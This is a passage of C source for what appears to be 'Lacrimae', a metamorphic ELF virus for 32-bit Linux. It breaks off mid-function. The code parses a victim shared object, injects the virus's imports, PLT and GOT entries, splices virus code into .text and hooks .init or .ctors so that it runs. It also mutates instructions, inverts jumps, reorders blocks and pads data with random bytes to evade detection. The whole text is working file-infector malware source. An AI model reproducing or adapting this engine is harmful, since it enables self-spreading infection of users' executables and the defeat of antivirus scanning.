static code_t *disassemble_victim(Elf32_Ehdr *ehdr)
{
	Elf32_Rel *rel;
	uint32_t si, so;
	code_t *centry;
	markinfo info;
	
	info.is_virus = 0;
	info.got_start = sec[SI_GOT]->ohdr->sh_addr - prelink;
	info.got_end = info.got_start + sec[SI_GOT]->ohdr->sh_size;
	info.dyn = (Elf32_Sym*)sec[SI_DYNSYM]->data;
	info.plt = sec[SI_RELPLT]->data;
	info.str = sec[SI_DYNSTR]->data;	
	info.base = (char*)ehdr;

	centry = sec[SI_TEXT]->fast[ehdr->e_entry - prelink - sec[SI_TEXT]->addr];
	if (centry == NULL)
		return NULL;
	/* we will mark everything that moves starting from entry point */
	if (mark(centry, &info, NULL, NULL
#ifdef	DEBUG_TRACE
			, 0
#endif	
	))
		return NULL;
	/* ... and relocs from .rel.dyn */
	for (rel = (Elf32_Rel*)sec[SI_RELDYN]->data; (char*)rel - (char*)sec[SI_RELDYN]->data < sec[SI_RELDYN]->size; rel++)
		if (ELF32_R_TYPE(rel->r_info) == R_386_RELATIVE) {
			if (section_io_by_addr(&si, &so, rel->r_offset - prelink))
				continue;
			uint32_t ptr = *(uint32_t*)(sections[si].data + so) - prelink;
			/* FIXME: use mark_addr() here? */
			if (section_io_by_addr(&si, &so, ptr) || sections[si].code == NULL)
				continue;
			if (mark(sections[si].fast[so], &info, NULL, NULL
#ifdef	DEBUG_TRACE
			, 0
#endif
			))
				return NULL;
		}
	return centry;
}

static void *extend_section(tsection *section, void *buf, int len) {
	void *ptr;
	section->data = (uint8_t*)realloc(section->data, section->size + len);
	ptr = section->data + section->size;
	if (buf != NULL)
		memcpy(ptr, buf, len);
	else
		bzero(ptr, len);
	section->size = section->size + len;
	return ptr;
}

static void add_symbol(char *name, int version) {
	unsigned char	*p_str, *p_rel, *p_plt, *p_got;
	Elf32_Sym	sym;
	Elf32_Rel	rel;
	uint32_t	got;
	uint8_t		plt[16];

	bzero(&sym, sizeof(Elf32_Sym));
	bzero(&rel, sizeof(Elf32_Rel));
	bzero(&plt, 16);
	bzero(&got, 4);
	/* insert symbol name (with trailing zero) into dynstr */
	p_str = extend_section(sec[SI_DYNSTR], name, strlen(name) + 1);
	/* add symbol to .dynsym */
	/* sym.st_value = sym.st_size = sym.st_shndx = 0 */
	sym.st_name	= p_str - sec[SI_DYNSTR]->data;
	sym.st_info	= ELF32_ST_INFO(STB_GLOBAL, STT_FUNC);
	sym.st_other	= STV_DEFAULT;
	extend_section(sec[SI_DYNSYM], &sym, sizeof(Elf32_Sym));
	/* add plt entry */
	plt[0]		= 0xff;
	plt[1]		= 0xa3; 	/* jmp	*0x00(%ebx)	*/
	plt[6]		= 0x68; 	/* push $0x00000000	*/
	plt[11]		= 0xe9;		/* jmp	.plt		*/	
	p_plt = extend_section(sec[SI_PLT], &plt, 16);
	*((uint32_t*)(p_plt + 12)) = sec[SI_PLT]->data - (p_plt + 11 + 5);
	/* add .rel.plt entry */
	rel.r_info = ELF32_R_INFO(sec[SI_DYNSYM]->size / sizeof(Elf32_Sym) - 1, R_386_JMP_SLOT);
	p_rel = extend_section(sec[SI_RELPLT], &rel, sizeof(Elf32_Rel));
	*((uint32_t*)(p_plt + 7)) = p_rel - sec[SI_RELPLT]->data;
	/* add .got.plt entry */
	p_got = extend_section(sec[SI_GOTPLT], &got, 4);
	*((uint32_t*)(p_plt + 2)) = p_got - sec[SI_GOTPLT]->data;
	/* add version number */
	if (sec[SI_GNUVERSION])
		extend_section(sec[SI_GNUVERSION], &version, 2);
	/* we also need to fix rel and got entries, do it later ... */		
}

/* return _offset_ within .plt section for given symbol (by name) */
static int symbol_to_plt(char *symbol)
{
	int	i;
	Elf32_Rel *rel = (Elf32_Rel*)sec[SI_RELPLT]->data;
	Elf32_Sym *sym = (Elf32_Sym*)sec[SI_DYNSYM]->data;
	for ( ; (char*)rel - (char*)sec[SI_RELPLT]->data < sec[SI_RELPLT]->size; rel++) {
		if (! strcmp(symbol, sym[ELF32_R_SYM(rel->r_info)].st_name + sec[SI_DYNSTR]->data))
			for (i = 16; i < sec[SI_PLT]->size; i+= 16)
				if (*((uint32_t*)(sec[SI_PLT]->data + i + 7)) == (char*)rel - (char*)sec[SI_RELPLT]->data)
					return i;
	}
	return -1;
}

/* mix two code chains */
static code_t *code_mixer(code_t *c1, code_t *c2)
{
	code_t *chain, *c0;
	chain = c1;
	for (;;) {
		while (c1->next && (c1->diza.flags & C_STOP) == 0)
			c1 = c1->next;
		if (c1->next == NULL) {
			c1->next = c2;
			return chain;
		}
		c0 = c1->next;
		c1->next = c2;
		c1 = c2;
		c2 = c0;
	}
}

static uint32_t fix_addr(uint32_t addr)
{
	uint32_t si, so;

	if (addr == 0)
		return 0;
	if (section_io_by_addr(&si, &so, addr - prelink) == 0) {
		if (sections[si].code != NULL) {
			if (sections[si].fast[so] != NULL)
				return sections[si].fast[so]->dsta + prelink;
		} else {
			so = so + sections[si].addr;
#ifdef	EXTEND_CTOR
			if (&sections[si] == sec[SI_CTOR] && so >= (sections[si].size - 8))
				so += 4;
#endif
			return so;
		}
	}
	exit(11); /* FIXME */
}

static int check_elf_header(Elf32_Ehdr *ehdr, Elf32_Phdr *phdr)
{
	Elf32_Phdr *ph;

	if (*(uint32_t*)ehdr->e_ident != 0x464c457f ||
	ehdr->e_type != ET_DYN ||
	ehdr->e_machine != EM_386 ||
	ehdr->e_version != EV_CURRENT ||
	(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE && ehdr->e_ident[EI_OSABI] != ELFOSABI_LINUX))
		return 1;
#ifndef	ADVANCED_MARKER
	if (ehdr->e_ident[15] != 0)
		return 1;
#endif
	FOR_EACH_PHDR(ph)
		if (ph->p_offset == 0 && ph->p_type == PT_LOAD) {
			prelink = ph->p_vaddr;
			break;
		}
	return 0;
}

static void freec(code_t *code, uint32_t flag)
{
	code_t *c, *me;
	for (me = NULL; code != NULL; ) {
		c = code->next;
		if (code->flags & flag) {
			if (me == NULL) {
				me = code;
			} else {
				me->next = code;			
				me = code;
				me->next = NULL;
			}
		} else {
			if (code->flags & FL_FREESRC)
				free(code->src);
			if (code->flags & FL_EXTERN)
				free(code->symbol);
			free(code);
		}
		code = c;
	}
}

static void fix_symtab(Elf32_Sym *sym, int sz) {
	int i;
	for (i = 0; i < sz/sizeof(Elf32_Sym); i++)
		if (sym[i].st_value) {
			if (ELF32_ST_TYPE(sym[i].st_info) == STT_SECTION && sym[i].st_shndx < shnum)
				sym[i].st_value = sections[sym[i].st_shndx].addr;
			else
				sym[i].st_value = fix_addr(sym[i].st_value);
		}
}

/* FIND ALL SYMBOLS WHICH WE NEED, BUT VICTIM LACKS */
static int add_virus_imports(void)
{
	char *missing[MAX_IMPORTS];	
	int i, j, k;
	code_t *c;
	uint8_t *hash;
	uint32_t nsyms, bucks, hsize;
	
	bzero(missing, MAX_IMPORTS * 4);

	i = 0;
	FOR_EACH(virus, c)
		if ((c->flags & FL_EXTERN) && lookup(c->symbol, (uint32_t*)sec[SI_HASH]->data, (Elf32_Sym*)sec[SI_DYNSYM]->data, sec[SI_DYNSTR]->data) == -1) {
			k = 0;
			for (j = 0; j < i; j++)
				if (!strcmp(missing[j], c->symbol)) {
					k++;
					break;
				}
			if (k == 0)
				missing[i++] = c->symbol;
		}
	if (i == 0)
		return 0;		
	/* version */
	int min_indx = 0;		
#ifdef	PARSE_VERSIONR
	if (sec[SI_GNUVERSIONR]) {
		int vnum = 0;
		/* find the number of version structures */
		Elf32_Dyn *dynamic = (Elf32_Dyn*)sec[SI_DYNAMIC]->data;
		for (j = 0; dynamic[j].d_tag != DT_NULL; j++)
			if (dynamic[j].d_tag == DT_VERNEEDNUM)
				vnum = dynamic[j].d_un.d_val;
		/* find the lowest version index */
		char *strtab = sections[sec[SI_GNUVERSIONR]->ohdr->sh_link].data;
		Elf32_Verneed *vn = (Elf32_Verneed*)sec[SI_GNUVERSIONR]->data;
		Elf32_Vernaux *va;
		char *name, *min_name = NULL;
		
		for (j = 0; j < vnum; j++) {
			name = vn->vn_file + strtab;
			if (strstr(name, libcso) && vn->vn_cnt) {
				va = (Elf32_Vernaux*)((char*)vn + vn->vn_aux);
				for (k = 0; k < vn->vn_cnt; k++) {
					name = strtab + va->vna_name;
					if (min_name == NULL || strcmp(min_name, name) > 0) {
						min_name = name;
						min_indx = va->vna_other;						
					}
					va = (Elf32_Vernaux*)((char*)va + va->vna_next);
				}
				break;
			}
			vn = (Elf32_Verneed*)((char*)vn + vn->vn_next);
		}
	}
#else
	if (sec[SI_GNUVERSION])
		min_indx = ((uint16_t*)sec[SI_GNUVERSION]->data) [
			lookup(libcstartmain, (uint32_t*)sec[SI_HASH]->data, (Elf32_Sym*)sec[SI_DYNSYM]->data, sec[SI_DYNSTR]->data) ];
#endif	/* PARSE_VERSIONR */
	if (min_indx < 2)
		min_indx = 2;

	/* add symbols */
	for (j = 0; j < i; j++)
		add_symbol(missing[j], min_indx);
	/* rebuild hash */
	if (sec[SI_HASH] == NULL)
		return 1;
	nsyms = sec[SI_DYNSYM]->size / sizeof(Elf32_Sym);
	bucks = *((uint32_t*)(sec[SI_HASH]->data));
	hsize = (bucks + nsyms + 2) * 4;
	if ((hash = (uint8_t*)malloc(hsize)) == NULL)
		return 1;
	bzero(hash, hsize);
	build_hash((uint32_t*)hash, bucks, nsyms, (Elf32_Sym*)sec[SI_DYNSYM]->data, sec[SI_DYNSTR]->data);
	free(sec[SI_HASH]->data);
	sec[SI_HASH]->data = hash;
	sec[SI_HASH]->size = hsize;
	return 0;
}

/* LOAD `sections' and fill sec array (for the fast access to sections) */
static int load_elf(Elf32_Ehdr *ehdr)
{
	char *strtab;
	int i, j;
	Elf32_Shdr *shdr;
	uint8_t *m = (char*)ehdr;
	
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
	shnum = ehdr->e_shnum;
	if ((sections = (tsection*)malloc(sizeof(tsection) * shnum)) == NULL)
		return 1;
	bzero(sections, sizeof(tsection) * shnum);
	bzero(sec, SI_SIZE * 4);
	/* initialize string table (section names) */
	if (ehdr->e_shstrndx == SHN_UNDEF)
		return 1;
	strtab	= m + shdr[ehdr->e_shstrndx].sh_offset;	
	for (i = 0; i < shnum; i++) {
		sections[i].ohdr = &shdr[i];
		sections[i].size = shdr[i].sh_size;
		sections[i].addr = shdr[i].sh_addr;
		if (shdr[i].sh_addr)
			sections[i].addr -= prelink;
		char *name = strtab + shdr[i].sh_name;			
		uint32_t name_hash = crc32(0, name, strlen(name));
		/* by name */
		for (j = 0; j < SI_BYHASH; j++)
			if (name_hash == hn[j]) {
				sec[j] = &sections[i];
				break;
			}
		/* by type */
		if (shdr[i].sh_type == SHT_HASH)
			sec[SI_HASH] = &sections[i];
		else
		if (shdr[i].sh_type == SHT_DYNSYM) {
			sec[SI_DYNSYM] = &sections[i];
			sec[SI_DYNSTR] = &sections[shdr[i].sh_link];
		} else
		if (shdr[i].sh_type == SHT_DYNAMIC)
			sec[SI_DYNAMIC]	= &sections[i];
		else
		if (shdr[i].sh_type == SHT_GNU_versym)
			sec[SI_GNUVERSION] = &sections[i];
		else
		if (shdr[i].sh_type == SHT_GNU_verneed)
			sec[SI_GNUVERSIONR] = &sections[i];

		if (sections[i].addr > 0)
			st = insert(i, sections[i].addr, sections[i].addr + sections[i].size, st);
		if (sections[i].size > 0) {
			/* disassemble .init,.text,.fini, but not .plt */
			if (shdr[i].sh_type == SHT_PROGBITS && (shdr[i].sh_flags & SHF_EXECINSTR) == SHF_EXECINSTR && (&sections[i] != sec[SI_PLT])) {
				sections[i].fast = (code_t**)malloc(shdr[i].sh_size * 4);
				if (sections[i].fast == NULL)
					return 1;
				bzero(sections[i].fast, shdr[i].sh_size * 4);
				sections[i].code = disassemble(NULL, m, sections[i].fast, shdr[i].sh_offset, shdr[i].sh_offset, shdr[i].sh_offset + shdr[i].sh_size);
				if (sections[i].code == NULL)
					return 1;

				if (ehdr->e_entry >= shdr[i].sh_addr && ehdr->e_entry < shdr[i].sh_addr + shdr[i].sh_size)
					sec[SI_TEXT] = &sections[i];
			} else
			/* do not allocate space for bulks */
			if (shdr[i].sh_type != SHT_NOBITS) {
				sections[i].data = (uint8_t*)malloc(shdr[i].sh_size);
				if (sections[i].data == NULL)
					return 1;
				memcpy(sections[i].data, m + shdr[i].sh_offset, sections[i].size);
			}			
		}
	}
	balance(&st);
	/* check, if we have all neccessary pointers */
#define	CHECK(x)	if (sec[x] == NULL) return 1
	CHECK(SI_PLT);
	CHECK(SI_GOT);
	CHECK(SI_GOTPLT);
	CHECK(SI_RELPLT);
	CHECK(SI_RELDYN);
	CHECK(SI_DYNSTR);
	CHECK(SI_DYNSYM);
	CHECK(SI_DATA);
	CHECK(SI_DYNAMIC);
#ifdef	PRELINK_PERFECT
	CHECK(SI_INTERP);
#endif
#ifdef	EXTEND_CTOR
	CHECK(SI_CTOR);
#else
	CHECK(SI_INIT);
#endif
	return 0;
}

static int insert_code(void)
{
	int i, j, k;
	code_t *c;

	sec[SI_TEXT]->code = code_mixer(sec[SI_TEXT]->code, virus);
	/* adjust alignment */
	FOR_EACH(sec[SI_TEXT]->code, c) {
		if (c->next && (c->next->flags & FL_ALIGN)) {
			uint32_t als;
			code_t *d;
			d = c;		/* last significant insn */
			c = c->next;	/* first alignment insn */
			als = c->asrc;	/* offset of the padding bytes */
			while (c->flags & FL_ALIGN) {
				code_t *f;
				als += c->diza.len;
				f = c;
				c = c->next;
				free(f);
			}
			for (j = 16; j > 0; j >>= 1)
				if ((als % j) == 0)
					break;
			if (j == 1)
				j--;
#ifdef	FORCE_ALIGN
			if (c->al == 0)
#endif
			c->al = j;

			d->next = c;
			c = d;
		}
	}
	freec(sec[SI_TEXT]->code, FL_SEEN);
#ifdef	M_BRO
	/* reorder blocks: so the last will be first (Matthew 20:16) */
	/* sooner or later. with given probability. */
	FOR_EACH(sec[SI_TEXT]->code, c)
		if ((c->diza.flags & C_STOP) && c->next) {
			if (_random(M_BRO_PROB) != 1)
				continue;
			code_t *d = c;
			c = c->next;
			code_t *b = c;
			while (c && (c->diza.flags & C_STOP) == 0)
				c = c->next;
			if (c == NULL || c->next == NULL)
				break;
			d->next = c->next;
			c->next = sec[SI_TEXT]->code;
			sec[SI_TEXT]->code = b;
			if (c->flags & FL_ME)
				virus = b;
			c = d;
		}
#endif	/* M_BRO */
#ifdef	M_IJCC
	/* invert conditional jumps (feature was introduced since version 0.27) */
	code_t *prev;
	for (prev = NULL, c = sec[SI_TEXT]->code; c != NULL; c = c->list) {
		c->list = c->next;
		if (((c->src[0] & 0xf0) == 0x70 || (c->src[0] == 0x0f && c->src[1] & 0xf0) == 0x80) && _random(M_IJCC_PROB) != 1) {
			if ((c->flags & FL_FREESRC) == 0) {
				char *temp;
				if ((temp = malloc(c->diza.len)) == NULL)
					goto fatal;
				memcpy(temp, c->src, c->diza.len);
				c->src = temp;
				c->flags |= FL_FREESRC;
			}
			if (*c->src == 0x0f)
				c->src[1] ^= 1;
			else
				c->src[0] ^= 1;
			code_t *t = c->link;
			c->link = c->next;
			c->next = t;
		}
		/* vexillum non est ponenda sine necessitate */
		c->flags &= ~FL_SEEN;
	}
	for (prev = NULL, c = sec[SI_TEXT]->code; c != NULL; c = c->list) {
		if ((c->flags & FL_SEEN) == 0) {
			code_t *d;
			for (d = c; d != NULL; d = d->next) {
				if (d->flags & FL_SEEN) {
					code_t *jmp = NEW(code_t);
					jmp->src = malloc(5);
					if (jmp == NULL || jmp->src == NULL)
						goto fatal;
					jmp->flags = FL_FREESRC | (prev ? prev->flags & FL_ME : 0);
					jmp->diza.flags |= C_REL | C_STOP | C_DATA66;
					jmp->diza.len = 5;
					jmp->src[0] = 0xe9;					
					jmp->link = d;
					d = jmp;
				}
				if (prev != NULL)
					prev->next = d;
				prev = d;
				prev->flags |= FL_SEEN;
				if (d->diza.flags & C_STOP)
					break;
			}
		}
	}
	prev->next = NULL;
	/* clean jumps */
	FOR_EACH(sec[SI_TEXT]->code, c)
		if (c->flags & FL_ME)
			c->flags &= ~FL_SEEN;
	void dce_virus(code_t *code) {
		code_t *c;
		FOR_EACH(code, c) {
		next:	if (c->flags & FL_SEEN)
				return;
			c->flags |= FL_SEEN;
			if (*c->src == 0xc3)
				return;
			if ((c->diza.flags & C_REL) && (c->flags & FL_EXTERN) == 0) {
				/* there is no labels on jumps because of (2) */
				/* (1) remove jmp-to-jmp */
				if (*c->link->src == 0xe9 || *c->link->src == 0xeb)
					c->link = c->link->link;
				if (c->diza.flags & C_STOP) {
					/* (2) remove jmp-to-following insn */
					if (c->next == c->link)
						c->flags &= ~FL_SEEN;
					c = c->link;
					goto next;
				} else
					dce_virus(c->link);
			}
		}
	}
	dce_virus(ventry);
	freec(sec[SI_TEXT]->code, FL_SEEN);
#endif	/* M_IJCC */
#ifdef	MUTATE
/* mutate() was added to Lacrimae since version 0.24 (2007-12-13) */
/* this is adopted mutation routines from the RPME 1.2 by Z0mbie (MUTATE1-4) and BI-PERM by Malum (MUTATE5) */
	FOR_EACH(sec[SI_TEXT]->code, c) {
		uint8_t b0, b1, t;

		b0 = c->src[0];
		b1 = c->src[1];
		if ((b1 & 0xc0) != 0xc0)
			continue;		
#ifdef	MUTATEx1
		/* add/sub r,x <> sub/add r,-x <> lea/lea r,[r + x/-x] / dec/inc r (if x == -1/1) */
		if ( /* FIXME: (b0 & 0xf0) == 0x40 || */
			(b0 == 0x05 || b0 == 0x2d) ||
			(b0 == 0x81 && ((b1 & 0xf8) == 0xc0 || (b1 & 0xf8) == 0xe8)) ||
			(b0 == 0x8d && ((b1 & 0xc0) == 0x80) && ((b1 >> 3) & 7) == (b1 & 7)))
			if ((c->flags & (FL_GOTPTR1|FL_GOTPTR2|FL_GOTOFF)) == 0) {
#ifdef	DEBUGx1
			for (i = 0; i < c->diza.len; i++)
				putb(c->src[i]);
			putchar(32);
#endif
			char *x = malloc(8), reg, d, s;
			uint32_t imm;
			if ((b0 & 0xf8) == 0x40)
				imm = 1;
			else
			if ((b0 & 0xf8) == 0x48)
				imm = -1;
			else
				imm = *(uint32_t*)(c->src + c->diza.len - 4);
			if (b0 == 0x05 || b0 == 0x2d)
				reg = 0;
			else {
				if ((b0 & 0xf0) == 0x40)
					reg = b0 & 7;
				else
					reg = b1 & 7;
			}
			if (b0 == 0x2d || (b1 & 0xf8) == 0xe8 || (b0 & 0xf8) == 0x48)	/* SUB/DEC? */
				s = 1;
			else
				s = 0;
			c->diza.len = 6;
			if ((d = _random(3)) == 0) {		/* ADD */
				if (imm == 1 && _random(2) == 1) {
					x[0] = 0x40 | reg;
					c->diza.len = 1;
				} else {
					if (reg == 0 && _random(2) == 1) {
						x[0] = 0x05;
						c->diza.len = 5;
					} else {
						x[0] = 0x81;
						x[1] = 0xc0 | reg;
					}
				}
			} else if (d == 1) {			/* LEA */
				x[0] = 0x8d;
				x[1] = 0x80 | (reg << 3) | reg;
				if (reg == 4) {
					x[2] = 0x24;
					c->diza.len = 7;					
				}				
			} else {				/* SUB */
				if (imm == -1 && _random(2) == 1) {
					x[0] = 0x48 | reg;
					c->diza.len = 1;
				} else {
					if (reg == 0 && _random(2) == 1) {
						x[0] = 0x2d;
						c->diza.len = 5;
					} else {
						x[0] = 0x81;
						x[1] = 0xe8 | reg;
					}
				}
			}
			if (c->diza.len != 1) {
				uint32_t *arg = (uint32_t*)(x + c->diza.len - 4);
				if (s != (d >> 1))
					*arg = -imm;
				else
					*arg = imm;
			}
			if (c->flags & FL_FREESRC)
				free(c->src);
			c->flags |= FL_FREESRC;
			c->src = x;
#ifdef	DEBUGx1
			for (i = 0; i < c->diza.len; i++)
				putb(c->src[i]);
			putchar(10);
#endif
			continue;
		}
#endif	/* MUTATEx1 */
		if (c->diza.len != 2)
			continue;

		// 10001001 11xxxyyy     ; mov r1,r2
		// 01010xxx 01011yyy     ; push r2 // pop r1
		// 10001011 11xxxyyy     ; mov r1,r2
		// 01010yyy 01011xxx     ; push r2 // pop r1
		if ((b0 & 0xFD) == 0x89 && _random(MUTATE1) == 1) {
			t = b0;
			b0=0x50 | ((b1 >> (t == 0x89 ? 3 : 0)) & 7);
			b1=0x58 | ((b1 >> (t == 0x89 ? 0 : 3)) & 7);
		}
		// 00ttt001 11xxxyyy     ; ttt r1,r2 (ADD,ADC,AND,OR,SUB,SBB,XOR,CMP)
		// 00ttt011 11yyyxxx
		// 10001001 11xxxyyy     ; mov r1,r2
		// 10001011 11yyyxxx
		if ((((b0 & 0xC4) == 0x00) || ((b0 & 0xFC) == 0x88)) && _random(MUTATE2) == 1) {
			b0 ^= 0x02;
			b1 = 0xC0 | ((b1 >> 3) & 7) | ((b1 & 7) << 3);
		}
		//if (xxx==yyy)
		//001100xx 11xxxyyy     ; xor r1,r1
		//001010xx 11xxxyyy     ; sub r1,r1
		if ((((b0&0xFC)==0x30)||((b0&0xFC)==0x28)) && (((b1>>3)&7)==(b1&7)) && _random(MUTATE3) == 1) {
			b0 ^= 0x30 ^ 0x28;
		}
		//if (xxx==yyy)
		//0000100x 11xxxyyy     ; or r1,r1
		//1000010x 11xxxyyy     ; test r1,r1
		if ((((b0&0xFE)==0x08)||((b0&0xFE)==0x84)) && (((b1>>3)&7)==(b1&7)) && _random(MUTATE4) == 1) {
			b0 ^= 0x08^0x84;
		}
		// test/xchg
		if ((b0 & 0xfc) == 0x84 && _random(MUTATE5) == 1) {
			b1 = 0xC0 | ((b1 >> 3) & 7) | ((b1 & 7) << 3);
		}
		
		if (b0 != c->src[0] || b1 != c->src[1]) {
			if ((c->flags & FL_FREESRC) == 0) {
				c->src = malloc(2);
				c->flags |= FL_FREESRC;
			}
			c->src[0] = b0;
			c->src[1] = b1;
		}
	}
#endif /* MUTATE */
#ifdef	OJMP
	/* optimize short/near jumps (feature was introduced since v. 0.28) */
	code_t *jmps;
	/* pass 1: set initial size of jumps, addresses and fill the list */
	prev = jmps = NULL; k = 0;
	sec[SI_TEXT]->code->al = 0;
	FOR_EACH(sec[SI_TEXT]->code, c) {
		if ((c->diza.flags & C_REL) && (*c->src != 0xe8)) {
			/* build the list of jumps */
			if (jmps == NULL) {
				jmps = c;
				prev = c;
			} else {
				prev->list = c;
				prev = c;
			}
			/* "down" conversion (near -> short) */
			if (c->diza.len != 2)
				if (convert_rel(c, 1))
					goto fatal;
		}
		/* alignment (the same as in the assembly routine */
		if (c->al)
			k = ALIGN(k, c->al);
		/* unused field as temp-address */
		c->diza.dst_set	= k;
		k += c->diza.len;
	}
	if (jmps) {
		/* close the list */
		prev->list = NULL;
		/* pass2: iterate through jmps list, expand jumps if neccessary and adjust addresses */
		do for (i = 0, prev = NULL, c = jmps; c != NULL; c = c->list)
			if ((j = c->link->diza.dst_set - c->diza.dst_set - 2) < -128 || j > 127) {
				/* "up" conversion (short -> near) */
				if (convert_rel(c, 0))		
					goto fatal;
				/* remove this jump from the list */
				if (prev == NULL)
					jmps = c->list;
				else
					prev->list = c->list;
				/* adjust addresses of all commands ahead */
				if (c->next) {
					code_t *d;				
					k = c->diza.dst_set + c->diza.len;
					for (d = c->next; d != NULL; d = d->next) {
						if (d->al)
							k = ALIGN(k, d->al);
						d->diza.dst_set = k;
						k += d->diza.len;
					}
					/* more jumps might go out-of-range */
					i++;
				}
			} else prev = c;
		while (i != 0);
	}
#endif	/* OJMP */
/* EXTEND SECTIONS */
	j = (uint32_t)&data_end - (uint32_t)&virus;
	/* you cannot just substract the virus data length from the
	top of the data section and decrypt our precious constants */
	k = j + _random(128) + 8;
	uint8_t *data = extend_section(sec[SI_DATA], NULL, k);
	for (i = j; i < k; i++)
		data[i] = _random(256);
#ifdef	EXTEND_CTOR
	extend_section(sec[SI_CTOR], NULL, 4);
	extend_section(sec[SI_RELDYN], NULL, sizeof(Elf32_Rel));
#else
	/* add another call to .init */
	d = NULL;
	FOR_EACH(sec[SI_INIT]->code, c)
		if (IS_CALL(c->src))
			d = c;
	if (d == NULL)
		return 1;
	c = NEW(code_t);
	c->src = (uint8_t*)NEW(uint64_t);
	if (c == NULL || c->src == NULL)
		return 1;
	c->flags |= FL_FREESRC;
	c->src[0] = 0xe8;
	c->diza.len = 5;
	c->link = ventry;
	c->next = d->next;
	d->next = c;
#endif
	return 0;
#if defined(M_IJCC) || defined (OJMP)
fatal:	/* FIXME
	freec(sec[SI_TEXT]->code, 0);
	sec[SI_TEXT]->code = NULL;
	virus = NULL;
	free(fastvirus);
	fastvirus = NULL;*/
	return 1;
#endif
}

/* BUILD NEW ELF FILE */
static uint8_t *build_elf(Elf32_Ehdr *ehdr, Elf32_Phdr *phdr, int l, int *elf_size)
{
	Elf32_Phdr *ph;
	Elf32_Shdr *sh;
	uint32_t elf_off, elf_adr;
	int i, j, k;
	uint8_t *m, *file;
	code_t *c;

	m = (uint8_t*)ehdr;
	file = (uint8_t*)malloc(l * 4);
	if (file == NULL)
		return NULL;
	bzero(file, l * 4);
	/* copy EHDR and PHT */
	elf_off = sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr) * ehdr->e_phnum;
	elf_adr = elf_off + prelink;
	memcpy(file, m, sizeof(Elf32_Ehdr));
	memcpy(file + sizeof(Elf32_Ehdr), m + ehdr->e_phoff, sizeof(Elf32_Phdr) * ehdr->e_phnum);
	ph = (Elf32_Phdr*)(file + sizeof(Elf32_Ehdr));
	for (k = 1, i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type != PT_LOAD)
			continue;
		if (phdr[i].p_offset != 0) {
			ph[i].p_offset = elf_off;
			ph[i].p_vaddr = elf_adr;
			ph[i].p_paddr = elf_adr;
		}
		for (j = 1; j < shnum; j++) {
			/* does the j-th sections belongs to i-th segment? */
			if ((sections[j].ohdr->sh_addr < phdr[i].p_vaddr) || (sections[j].ohdr->sh_addr >= (phdr[i].p_vaddr + phdr[i].p_memsz))) //
				continue;
			/* sh_addralign     Some sections have address alignment constraints. For example, if a section
		                            holds a doubleword, the system must ensure doubleword alignment for the
		                            entire section. That is, the value of sh_addr must be congruent to 0,
		                            modulo the value of sh_addralign. Currently, only 0 and positive
	        	                    integral powers of two are allowed. Values 0 and 1 mean the section has no
		                            alignment constraints. */														  
			if (sections[j].ohdr->sh_addralign > 1) {
				uint32_t a;
				a = ALIGN(elf_adr, sections[j].ohdr->sh_addralign) - elf_adr;
				elf_adr	+= a;
				elf_off += a;
			}
			sections[j].offset = elf_off;
			sections[j].addr = elf_adr;
			if (sections[j].ohdr->sh_addr == 0)
				continue;
			/* doesn't occupy space */
			if (sections[j].ohdr->sh_type == SHT_NOBITS) {
				elf_adr += sections[j].size;							
				continue;
			}
			/* assemble */
			uint8_t	*ptr;
			if (sections[j].code != NULL) {
				ptr = file + sections[j].offset;
				/* no alignment before the first insn */
				sections[j].code->al = 0;
				FOR_EACH(sections[j].code, c) {
					if (c->al) {
						uint32_t t;
						t = ptr - file;
						t = ALIGN(t, c->al) - t;
						if (t > 0) {
							memcpy(ptr, padding_bytes + (t * (t - 1) / 2), t);
							ptr += t;
						}
					}
					c->dsta = ptr - file;
					memcpy(ptr, c->src, c->diza.len);
					ptr += c->diza.len;
				}				
				sections[j].size = ptr - (file + sections[j].offset);
				/* src field still can be used for calculations, but cannot be accessed */
				ptr = sections[j].data;
				sections[j].data = NULL;
			} else {
				/* copy non-code section */
				memcpy(file + sections[j].offset, sections[j].data, sections[j].size);
				ptr = sections[j].data;
				sections[j].data = file + sections[j].offset;
			}
			elf_off += sections[j].size;
			elf_adr += sections[j].size;
			/* free section[j].data */
			free(ptr);
		}
		ph[i].p_filesz = elf_off - ph[i].p_offset;
		ph[i].p_memsz = elf_adr - ph[i].p_vaddr;
		ph[i].p_align = PAGE_SIZE;
		elf_adr += PAGE_SIZE;
	}
	/* fix PHT entries pointing to individual sections like PT_INTERP ... */
	for (k = 1, i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type != PT_LOAD)
			for (j = k; j < shnum; j++)
				if (phdr[i].p_offset == sections[j].ohdr->sh_offset) {
					ph[i].p_offset = sections[j].offset;
					ph[i].p_vaddr = sections[j].addr;
					ph[i].p_paddr = sections[j].addr;
					ph[i].p_filesz = sections[j].size;
					k = j;
					break;
				}
	/* copy non-loadable sections like .comment */
	for (j = 1; j < shnum; j++)
		if (sections[j].ohdr->sh_addr == 0) {
			/* align it */
			elf_off = ALIGN(elf_off, sections[j].ohdr->sh_addralign);
			
			memcpy(file + elf_off, sections[j].data, sections[j].size);
			free(sections[j].data);
			sections[j].data = file + elf_off;
			sections[j].offset = elf_off;
			sections[j].addr = 0;
			elf_off += sections[j].size;
		}
	/* copy and fix SHT */
	sh = (Elf32_Shdr*)(file + elf_off);
	memcpy(sh, m + ehdr->e_shoff, sizeof(Elf32_Shdr) * shnum);
	((Elf32_Ehdr*)file)->e_shoff = elf_off;
	for (i = 0; i < shnum; i++) {
		sh[i].sh_size = sections[i].size;
		sh[i].sh_offset = sections[i].offset;
		sh[i].sh_addr = sections[i].addr;
	}
	elf_off += sizeof(Elf32_Shdr) * shnum;
	/* copy the rest of file */
	k = ehdr->e_shoff + shnum * sizeof(Elf32_Shdr);
	i = l - k;
	if (i > 0) {
		memcpy(file + elf_off, m + k, i);
		elf_off += i;
	}
	*elf_size = elf_off;
	return file;
}

#ifdef	PRELINK_PERFECT
typedef struct {
	int l;
	char *m;
	uint16_t *versym;
	uint32_t nsyms;
	Elf32_Sym *dynsym;
	char *dynstr;
	int valid;
} libc_info;
char *find_libc(char *interp, char *filename) {
	char buf[128], *p, *q, mode[2];
	char cmd[strlen(interp) + 16 + strlen(filename)];
	sprintf(cmd, format, interp, filename);
	mode[0] = 'r';
	mode[1] = '\0';
	FILE *h = popen(cmd, mode);
	if (h) {
		while (fgets(buf, 128, h)) {
